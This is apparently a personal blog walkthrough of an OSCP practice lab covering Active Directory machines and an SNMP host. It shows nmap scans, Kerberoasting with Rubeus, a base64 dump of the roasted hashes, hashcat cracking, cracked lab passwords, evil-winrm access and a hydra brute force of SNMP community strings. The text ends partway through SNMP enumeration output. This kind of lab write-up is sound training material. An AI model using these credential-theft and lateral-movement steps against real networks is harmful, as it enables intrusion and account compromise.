---
title: OSCP B
date: 2026-01-06
draft: false
ShowToc: true
TocOpen: true
tags:
  - blog
  - Lateral-Movement-kerberosing
  - Windows-Privilege-Escalation-Windows-Files
  - Linux-Privilege-Escalation-Path-Variable-Escalation
  - CVE-2022-42889
  - Linux-Privilege-Escalation-java-Xdebug
  - Linux-Privilege-Escalation-KiteService
  - offsec
lastmod: 2026-02-27T17:09:20.178Z
---
# Box Info

This lab challenges learners to exploit exposed services and misconfigurations in an Active Directory environment. Starting with a Kerberoasting attack to crack service account credentials, learners perform lateral movement, configure SQL Server for command execution, and escalate privileges to NT AUTHORITY\SYSTEM using the SeImpersonatePrivilege. The exercise culminates in a domain compromise through hash extraction and reuse.

```
10.10.132.146

Challenge 5 - DC01 OS Credentials:

No credentials were provided for this machine

192.168.172.147

Challenge 5 - MS01 OS Credentials:

Eric.Wallows / EricLikesRunning800

10.10.132.148

Challenge 5 - MS02 OS Credentials:

No credentials were provided for this machine

192.168.172.149

Challenge 5 - Kiero OS Credentials:

No credentials were provided for this machine

192.168.172.150

Challenge 5 - Berlin OS Credentials:

No credentials were provided for this machine

192.168.172.151

Challenge 5 - Gust OS Credentials:

No credentials were provided for this machine

```

***

# Recon  192.168.X.147

### nmap

```shell
parallels@ubuntu-linux-2404:~/Desktop$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.217.147 -oN serviceScan.txt
[sudo] password for parallels: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-18 00:09 HKT
Nmap scan report for 192.168.217.147
Host is up (0.043s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          Microsoft IIS httpd 10.0
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
8080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
8443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2025-12-17T16:10:28+00:00; -1s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=MS01.oscp.exam
| Subject Alternative Name: DNS:MS01.oscp.exam
| Not valid before: 2022-11-11T07:04:43
|_Not valid after:  2023-11-10T00:00:00
|_http-title: Bad Request
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-17T16:10:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.66 seconds

```

### FTP 21 -- Scans

Dont have the findings in FTP

```
parallels@ubuntu-linux-2404:~/Desktop$ ftp 192.168.217.147     
Connected to 192.168.217.147.
220 Microsoft FTP Service
Name (192.168.217.147:parallels): Eric.Wallowsx
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed
ftp> 

```

### SSH 22 -- Scans

Enable as the eric.wallows to login in ssh

```shell
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.
   
oscp\eric.wallows@MS01 C:\Users\eric.wallows>whoami 
oscp\eric.wallows

oscp\eric.wallows@MS01 C:\Users\eric.wallows>

```

### eric.wallows To admin

I forgot to write , but should be the easy way , like the whoami /priv

# Recon 10.10.X.146

```
oscp\eric.wallows@MS01 C:\Program Files>ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : MS01
   Primary Dns Suffix  . . . . . . . : oscp.exam
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : oscp.exam

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-59-6D
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.201.147(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.201.254
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-AB-7D-59
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.161.147(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
   DNS Servers . . . . . . . . . . . : 10.10.161.146
   NetBIOS over Tcpip. . . . . . . . : Enabled

oscp\eric.wallows@MS01 C:\Program Files>

```

### MS01 To DC01

{{< toggle "Tag 🏷️" >}}

{{< tag " Lateral-Movement-kerberosing" >}} kerberoasing attack with the Rubeus.exe in windows

{{< /toggle >}}

As the highest privilege at this windows , will try the mimikatz or the kerberoast , in the oscp the method will not be too difficult

```kali
└─# wget https://raw.githubusercontent.com/theart42/redteamtools/refs/heads/main/Rubeus.exe
```

We use the ssh to login , so will alos use the scp to dwonlaod and upload

```
└─# scp -v ./Rubeus.exe Eric.Wallows@192.168.201.147:/programdata/Rubeus.exe
Executing: program /usr/bin/ssh host 192.168.201.147, user Eric.Wallows, command sftp
```

The easy way to kerberoast attack

```
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

Got  the Account of sql\_svc and web\_svc , and you can see the ServicePrincipalName is  MSSQL/MS02.oscp.exam , so the idea is the go the MSSQL on MS02 to do the privilege enumeration and allow the user can be RDP or winrm

```
oscp\eric.wallows@MS01 C:\ProgramData>.\Rubeus.exe kerberoast /outfile:hashes.txt

   ______        _
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : oscp.exam
[*] Searching path 'LDAP://DC01.oscp.exam/DC=oscp,DC=exam' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccou
ntControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 2


[*] SamAccountName         : sql_svc
[*] DistinguishedName      : CN=sql_svc,CN=Users,DC=oscp,DC=exam
[*] ServicePrincipalName   : MSSQL/MS02.oscp.exam
[*] PwdLastSet             : 11/10/2022 12:03:18 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\ProgramData\hashes.txt


[*] SamAccountName         : web_svc
[*] DistinguishedName      : CN=web_svc,CN=Users,DC=oscp,DC=exam
[*] ServicePrincipalName   : HTTP/MS01.oscp.exam
[*] PwdLastSet             : 11/10/2022 11:11:19 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\ProgramData\hashes.txt

[*] Roasted hashes written to : C:\ProgramData\hashes.txt
```

Use the base64 to copy and paste in the local kali

```
oscp\eric.wallows@MS01 C:\ProgramData>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\ProgramData> [Convert]::ToBase64String([IO.File]::ReadAllBytes("hashes.txt"))
JGtyYjV0Z3MkMjMkKnNxbF9zdmMkb3NjcC5leGFtJE1TU1FML01TMDIub3NjcC5leGFtQG9zY3AuZXhhbSokREQ3NjFBOTNGOTIyNjExNTNFMEE1QzZBOEQxMDJBREEkMTNBRTE2NTFDNEZEOENCNzRG
NzdEMDBBRjhFMzI0NDM2RjBFRDM3MTYwNTFDMzM4MDA1OTZBNEQyNkU5REVGREM2ODUzRjYwQjdGQ0NBMTBDNTE5REI1QjhCQzIyRUI5NTFBMzQ4NTFEOTcyMEYzQzg0NTBFMzhDQkIzQkVGNDUyMzBB
NkZBQjgzRThDM0RDMDU5RDNENjY4MEU2RTY0NEE2MzIwMUIyQ0Q3MjRGNTY2NDVGQTJCOUYyRTNFRjA2OTkyMUZERkUxRjJBM0FEQkNEMzdGRDdEMjc3NDk2QTk1MDJFNzdDNUI1OTI4MTAwRUNGNTY2
NEE2MEYwNkYzNDQzNzYyNUZDNkYwQzU4NjY1NEU2QkMzMzUyNjA3ODM3RjVFMzlGRTgwMDE3OURGMTMwRjVDQTVCNzY3NzQ0MERBMjYxMjcxRUUzNzYwMUQ0RTlCMjBDMjM5RURENTA5RTEyNUEwQkRE
RTA0RjlEODQ2OTlFMURCQkE0RDBEQzU4N0NCNDBENkE0MzQ3MUUzQUJDREYzRTYwQzk0MTAwRDRGQTJFNEE0MkE0MTJEQzFFM0U4NTMxRDZGMDQzRDdBNkRDQjEwNDNCNDAzN0FBODBBODEzQjY2NDVB
MzRCNENENEY4M0IxNTcyMDhCREMxMkNFQzEzOTYwREU1NUI1OERFMzdCODM1RTFDRTg5QzhEOEE0NzFCRTEwOTQ0QTk2MDg1RUYwN0Q2MjVBODYxMTFBNDY5QjM0NzAyQjMwRjEwQTY3QkI3MjI3MTc5
N0QwQ0ExMDBBQjVDNTgzNzkyRUY5QTc4QUQ2NjhENUIxQTk0OTNBMDM4RjJGQURBREE3RjJDM0YwREJDRjQ1MEY4MTBDRDYzRjQ3QzlGRUJGNTA2NjFDNkM0MzAwNzA0RUIwMTA2NEU2RUI4ODEyNjFG
NEFFOTZBREZBNjM4OTY3RjA1RTRDNjFCMzI5OUM1MDM0MTdDRTJBN0U1MDU1NUI4Njc0RUQ2NTE0RjVFMjFBMDYzMDJGRDlGMDcwRjY1NkZCMjZBMDJGQjI4REIzOUY4QUZGNjc1QTdERjRCMUZBMjU5
MUVERjQzRTE3NkI0Q0FENEJEMzUwMTVCMDRCMzE3QTU5REREMkIyQTg5NDQ2NUYyMDIwNTIzRjIwMTg0NjQxQ0RDNjgzNDA1MjA4M0VCRjY3MDYwNTEzOTg1NjhBRThGQTlDMzJBQTYwNzU5REQzOURF
QjFFRDQzREZFRUEzMDkxQzI3M0I4MTAxRDFFQzg5QkM0ODFFQUI1NzQxRUFGNzQ5NDU0REVENUVCMUFBODlERkRGQ0U2N0E3RkNEOUQ3MzUyMENDRkE3MDk0NTBFMzZCOEQzQkUzOTNCQUE4NjhCRkMx
MzA4MjVFODUxOUQ1OTExRjkxMDA1RDI5QzUwRThEMTU0RDUwNEUzOUNBNDc2ODRDNkJFMEU2ODM1OUFCMjM3M0Q3RTE1NkMyQjRBRUUzNEY1NUNGNEEwNTNGRTJCODhCQTREOTZDRjdFQjc3Q0ZFREEy
OEE2OUM1Njg3NEM1NEJDODc3NzY3NDQyNzA1RTMxQUE4MkI5M0I4N0Y0OTFDMDE5NTQ3QTFDODBGQTlGRjQ1MjhBNENFMEIxNzY0QTYxNUU0OUIyNUY1QUI0Q0EyOUZBRTJBQ0I0N0RGMjAwMDc2QjFE
NjA1MTYzNTNENjAxNERCMjA1RTg0NjE3MTcyNUYzRDUzRDYwMjU3OTY2NEExQjZDOEI1ODRCMTVBRDc1MzFCRkNEM0U4MjBCQkY2Qzk4ODhDOTM4RTZEMjkwN0RFMTFEM0ZCRjZERjVFOTBCNEUzMzE5
MTAyODE4MkFFM0U1NDcwOEE1M0E4OTM4NjRCMDJDNjY5ODU1MTQwOTg5QkRBMDlGNjc2NTY3RjQxMTQ4Q0E0MzA2MDBCN0MzQjM1MTRCMjFDMDNFOTkyNjU4RjE2Q0Y2Q0UwMTUzNzMxREU1MURBRTVG
QUExNkMzOEE3REMwMjkzMzE0QjUwNDE3MDA3RkNEMzNFNDI4QTU1RDI0OTNDNzRBREM0NDE5NkRFRTg3QjM0MTg5MUREMUQ0RUY0NkRGOTNGMDBGNDFDNDczOTJCNTRGOUY1RTAyQzlCMzc1NzQzQjc5
NDdEMDI2MjY1Q0EwNjM1RTBGRjMyM0MyOTA2QTYzNTcyNDQ2QTYxRkEzNUNENkIxQUNEREFBMUEyNEVERkVDNEU5NzdERjU1RjU3MTg1NTkyNTMyOTRCQkQwQzI4QTg5MEEwOUZFRTk0NkJERjg2Mjgy
NjU2M0UyRTdGMTNGNjdFMUYxNUExMTAyRDlDOTEzNkYzODYxQjA0NUE0M0NGMDQ4REYzOThBNTM5N0Q3NkJFMzMzQjZGRTI4MzU3QzgxRTFDMzFERDRGNzM5MkU2QjVENTNFRUQ3NDI2NDg3RDIzRDc1
MEUyMjEyOENCMTc3QjkwRUY0QTFGMkE4MTdCNTRGRjVDQTQzMTBFQ0U2MkFBMjg4MUY5ODkxN0FCMDFGNjY2RDNCRUFERTA5NUM1OERCMjA1RTVBOTJDQjE5NTQ1MzA4RkREOTk3M0FBQjY4MzY4OTc3
QjE5NDAyNjhERUVFMDk1NEMyQTc0MkZGREZGRjQ5QUU4RDlBRkRBM0JFRjg2OTlGQkRDMkRENjQ1NjNCOTNFMERBOUQwNUY0RTdFMEQyODYyMEMxMTAyNEE1MjYxRDlBOTVFOTQxNUY4N0U0REJGRTA2
Nzc0QUJBNTQ0NDI3NEM0NUIzMzZDQjAzRjNCNEQ5NkYwQTJDRDE3Njk4QUQyNEQ5NTYyOTA2Q0FBM0YwQTlDMDc5QTIxM0Q1N0RCMzA3NDNGQkMyNDY4NzU2RTYxQkQ0Qjc3MUZGNDhCODNBNUM4Nzcw
QTdFQkJDODA0NzdCRDEwRjJEN0VERDFEOTIyRjc4NTkyMEM1QUEzNkEzQjEyNTY1MjQ0QjI4MjUwRDg5RjVFQTQ1MjZGNDM0MDg4OEFEREMwQjFBNzA3NTBCOTlBMDk0NzA4RTRDNDQ0MkY3ODdFRjM0
MjkyQTVEDQoka3JiNXRncyQyMyQqd2ViX3N2YyRvc2NwLmV4YW0kSFRUUC9NUzAxLm9zY3AuZXhhbUBvc2NwLmV4YW0qJDNCQTM2RTQ4M0EyQjI4MDY2OTQ5NzM2MzlENDBBRjUxJDU1OUZBODJBQTcx
ODBCRTU3MDExODk0MjA4RTQ1REE1ODdGNzhFNTM5NkQ3NDYyODAzQTFGM0JCQkIyODZFQUVEM0I4NDEyRkMzOUEyOUUzQzcxMTVERDc3MTZFQzM5MjEzQUI2MjRDNEQyQTNCREREREY1Mjc1QzhEMTND
M0U5Njg1OTVFMkZGNzhENDg4QTQ3REVBQUIwQTU3RjlFMUQ3QzY0REM1RUM0MzY4NUFBOTA0NkYyODE5Qjc5QjYwNzk4NzJBRjI2QzZCNEY0MjIxMDI1MTk5RkIxMjFGNjA4MkRFMUUyQTNBRUJGQjcz
NjMyQ0Q4NEM2RTU2RDM4ODZDNTdGQjVGQjAzMDQzN0YxOTFGODE5QkY2QzQ4QzkxRkUzQTZFODY4MEREMUNGMDY0RDYyMDExMUU3RThCQjVGNzU5ODI2RDQzRUNCMTk5ODhGRDJBN0Y0NkFCQ0FBRDVD
QTBFMTRGOTAxMzkwNzNGODIyQkMyNzhERTk0MDI0MThCQjM2MDdGMEE4RTlDODNDREU3NUY4NzJDODVCQTkwRUQ2RjJEMDk3QkUwMkY4NzlGREU2RjZFQ0JCMkQ1NjlEOEFDQTBDQTM2QTFCNDNDRjQz
RTVGOTdBRDFEQjNEQ0I5RkE3NTY0NkUyRjg1RDUwOUM1NTY0Q0FENkZFQzJGRTdEQzM5OEUwMkRFMkIzQTgxQ0Y2OUM4OTNDNTg0N0MyOTNENDlBQUQ5MjYwRTAzNjk0QjJEOEZDODc4MjYwNDhBQ0E4
ODhFRDdEOTE1Qzg3MEIxODFFQTI2REMwMjZCMzJGNUQ3NDg0QjhEMEUyNjhBNjMyMDU4Rjk2NkE0QTVCRkQ1QjE2MDBCQ0NDODNFMjkzRTc2MEMyMEI1QUQ2NjM1RjA4MEMxNjgyNURCMTJEQUU0OTFC
REU3QTYwQjIxMzU0NjdFRTlCOEJFREQ2QzAxOTUyQzQ4NjcwODk3MjZCNDUzQjI0RTZDOTdEMjA5N0FGQUUxNkE2MjY0MkNGMUNCNDRBN0NCRjExREZCMjRDN0FFMDlGMUJGNDM5QTYyMkY1NEQyN0Iz
MjJGNzVGMDNDMzQ0MDFCQzRFRDU4RjY3N0U0NUYzQkM4RDY5MkJENzlBMEM0MzYzNjk4OTYzM0FGNTA2MjdGREE0NzdCMUU4NDUzQzg3NzQwMzdCQkExRjQ4QkMxOTBERjk1NkUzRjg4RTQwM0ZFQTc3
NUM3QjI2MkFBNzRGQ0YzQ0Y5NURGNDY0NTMwMjdBQTUzNzIwQTE3MTc3OURCMkIxOTdDOTUzQTY2N0QyQzM2NENDNkIxM0M4RDMzQkYxQTE3NDYyQ0M1OTE1NjYzQ0IxQzFBOUExMjBBREZFOEZBNDY3
MTk4QzdCRjA2QzQ5Q0FGQkM3MzkwQTk2RjYwMTU5NjhCMUY2MTgzRUMzQUZBRjJENjVBRTk2NEI2NjNGOTdBRDBFREQyNEMxRDlBNDA0NEMwRUY2QjhCNTA0OTU3RjExRDQ1M0YzNTRCMkE0RTRGNkM4
Nzg3RjA0Q0IwNzc4NkMxRDVCNDJBRjZFMzg3NzQ1M0ExRjE0MjVBNzNCRDgyRkYxNjhGRDM4QUNGODc5NEVFMjZBNDY1QjE3MTUxMDQ5RTBGQTNGNDVDQzFFQUY4MkQxMTc0QUMzNUUyN0MwMUU4MjE5
MzYyQzQ5NEFGQ0ZFRTdGMjY3MEM5MDIzNjRGM0QwOTRBOTNDOTBEMTJGNjgyN0NDRjMzMTRCNTU4NzNGODNCMkEwRjQzREM2QjczRTY1QzQ0RTUxM0U5QTlFREVEQjdGNUQ5QzdGOTkwQUYyMUE3RUVC
MDM0NUI0QUJFRTVFOTQyNjkwQjA0MDM5MjAyRkQ2REI3RjY3RkZGQTExQ0VFNUFBQTQxMTMzQTA5Qjc5REFDRTgzOEU2MUIzRDQ1MzVEN0E1OTJCMzAzNTYyNjBGRkUyMzhCN0E5QTE3OTQyMENEMkEx
NDZEN0FBQjI0NTY5NjU2N0RDRTdEOTk0MDNFQzgwNkE5RDY3QzFGNTNCQjlGMUMzODIyRTcxRjRDNkFENTZDNEQ0QjkyQTU2OUQ0RTlDMzJDQzUxREZCQ0I2MUE3QUM1REQ3MzA0Nzk5QUM5NTEwODZG
QkY5NjVBN0Q2Mzg2MDc1Mjk1RTVEMTZFNzkxRkJDRjY0OUY4RjMyRDU3OEY3OEJERkU5OEFBOURBRTNCRUMxMjEyRjA4NURFMDZFNTNCQTA3RDcxNkJBODQ0OUYxRkRBN0VDMzAzQjNFMTc0RDEyRUU3
ODNGRUQ2QjJGNTg3MDUzOTU1M0VEMzk5MjFDOTY0NkY1MDUzNUNFNjFFNDIyMjhDNkQ1M0M0ODU1NDIxOUY2QTM1MUE5QTc2MDBENEVGNTYzQTdFRTQ3MDY1MTUwNjdEODcwNUUyMDAxNEM4MkJENTE5
NEM2REQ1M0Y0MzlGODUwQUU3OTY0QUMyM0RENTFCM0UzOUM1QTVCQUM5MzI0Qzg5MzVCNTk4MjMzQjVEOTdFRDFGMTlEQTIxNDJFQTRBMkU2RTNEN0IwRUJEMjFGQzg5NkNBODc5QkRDNjZBODRCODkx
MEUxMzM5NDA4RDY2MDMwQjZCMzVFQ0NGQjI0OEQ2MTlDMTZDMDlDNjA1OTMyODEwN0ZDMzE4NkFDRDY1RUM4NTEzRjhEQkZFN0E3Q0VCODdDNUQ1MjJCMjhCMUFBQTFFNEE5N0MwRTkxNDQzQ0RBNDc0
QTVGRjM3MzA5MTZFOTdFMTRFMzAzRjkyQkEwRjRGQzE5NTYzMEIxRDYzQUE2MkMzQzgyQjcwMzk1NzM3RDUyNUQ0MkIxNjNGNTdFNzJCOTQ5Mzc0NzkzRDQ4RTIzMzRGNzFBQzNFMzUyNjhCNjFBN0JG
QkNCN0E0QjNGMzAxRkU2MzhEQzk2MUY2QzBDQTk2REIxRjg3NDM3MERGRjg0RTNERkVGREYzM0FFMzMyRUVEREEzOUI5QTFBQjE1QTA4REM5Q0FGRTA2NEUyMEZDQjcwQkY0NzVERUIwMjU3MTEyMjg5
Qzc2ODcxNUE5RDNCQQ0K
```

we got web\_svc: Diamond1 , svc\_sql:Dolphin1sh

```
└─# hashcat -m 13100 -a 0  hashes.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 7 255U, 7929/15858 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash

```

> i skip the step in here , you may use the https://github.com/projectdiscovery/naabu to scan all port which method is more faster then nmap , next , you will find the ssh 9050 , login in by the sql\_sve : Dolphin1 , and in the sql database server , you can upgrade to admin to let your account can be login in the evil-winrm , i suggest you to google it by enable user 5089 login

Do the ligolo proxy to let our network enable to connect the MS01

![Pasted image 20260108193007.png](/ob/Pasted%20image%2020260108193007.png)

```
└─# evil-winrm -i 10.10.161.148 -u sql_svc -p Dolphin1
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
```

![Pasted image 20260108212433.png](/ob/Pasted%20image%2020260108212433.png)

{{< toggle "Tag 🏷️" >}}

{{< tag " Windows-Privilege-Escalation-Windows-Files" >}}  Found the SAM and SYSTEM file in the windows old can be used to tom\_admin hash

{{< /toggle >}}

In the Windows old folder , Found the SAM and SYSTEM file can be used to tom\_admin hash\
![Pasted image 20251230003228.png](/ob/Pasted%20image%2020251230003228.png)

![Pasted image 20251230003747.png](/ob/Pasted%20image%2020251230003747.png)

***

# Recon 192.168.X.149

```shell
└─# sudo nmap -sU 192.168.160.149 --top-port=20                                                                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 23:21 HKT
Nmap scan report for 192.168.160.149
Host is up (0.19s latency).

PORT      STATE  SERVICE
53/udp    closed domain
67/udp    closed dhcps
68/udp    closed dhcpc
69/udp    closed tftp
123/udp   closed ntp
135/udp   closed msrpc
137/udp   closed netbios-ns
138/udp   closed netbios-dgm
139/udp   closed netbios-ssn
161/udp   open   snmp
162/udp   closed snmptrap
445/udp   closed microsoft-ds
500/udp   closed isakmp
514/udp   closed syslog
520/udp   closed route
631/udp   closed ipp
1434/udp  closed ms-sql-m
1900/udp  closed upnp
4500/udp  closed nat-t-ike
49152/udp closed unknown

```

### SNMP Recon 161,162,10161,10162 --scan

Use the `hydra` to know the snmp password is public

```
┌──(root㉿kali)-[~]
└─# hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.203.149 -I -V

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these ### ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-20 11:34:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://192.168.203.149:161/
[ATTEMPT] target 192.168.203.149 - login "" - pass "public" - 1 of 118 [child 0] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "private" - 2 of 118 [child 1] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "0" - 3 of 118 [child 2] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "0392a0" - 4 of 118 [child 3] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "1234" - 5 of 118 [child 4] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "2read" - 6 of 118 [child 5] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "4changes" - 7 of 118 [child 6] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "ANYCOM" - 8 of 118 [child 7] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "Admin" - 9 of 118 [child 8] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "C0de" - 10 of 118 [child 9] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "CISCO" - 11 of 118 [child 10] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "CR52401" - 12 of 118 [child 11] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "IBM" - 13 of 118 [child 12] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "ILMI" - 14 of 118 [child 13] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "Intermec" - 15 of 118 [child 14] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "NoGaH$@!" - 16 of 118 [child 15] (0/0)
[161][snmp] host: 192.168.203.149   password: public
[STATUS] attack finished for 192.168.203.149 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-20 11:34:29

```

So then base on the password to do the `snmpbulkwalk` and last sentence is ` Resetting password of kiero to the default value` so i assume there is the account of `kiero`:`kiero`

```shell
└─# snmpbulkwalk -v2c -c public 192.168.203.149  -m all NET-SNMP-EXTEND-MIB::nsExtendOutputFull

MIB search path: /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
Cannot find module (IANA-STORAGE-MEDIA-TYPE-MIB): At line 19 in /usr/share/snmp/mibs/ietf/VM-MIB
Did not find 'IANAStorageMediaType' in module #-1 (/usr/share/snmp/mibs/ietf/VM-MIB)
Cannot find module (IEEE8021-CFM-MIB): At line 30 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
[]Cannot find module (LLDP-MIB): At line 35 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
Did not find 'dot1agCfmMdIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMaIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepIdentifier' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepDbEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmIngressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmEgressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmRemoteMepState' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
Cannot find module (IANA-SMF-MIB): At line 28 in /usr/share/snmp/mibs/ietf/SMF-MIB
Did not find 'IANAsmfOpModeIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
